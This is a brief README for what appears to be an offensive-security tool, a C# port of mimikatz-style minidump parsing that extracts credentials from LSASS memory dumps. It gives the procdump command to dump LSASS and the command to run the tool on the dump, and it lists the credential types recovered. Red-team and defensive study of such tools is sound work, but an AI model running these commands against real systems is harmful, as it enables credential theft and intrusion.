# Minidump

C# implementation of mimikatz/pypykatz minidump functionality to get credentials from LSASS dumps.

![poc](Images/poc.png)



### Usage

```
procdump64.exe -ma lsass.exe lsass.dmp
C:\minidump.exe lsass.dmp
```



### Supported Credentials

* Lsa
* Msv
* Kerberos
* WDigest
* SSP
* TsPkg
* Credman
* Dpapi
* CloudAP
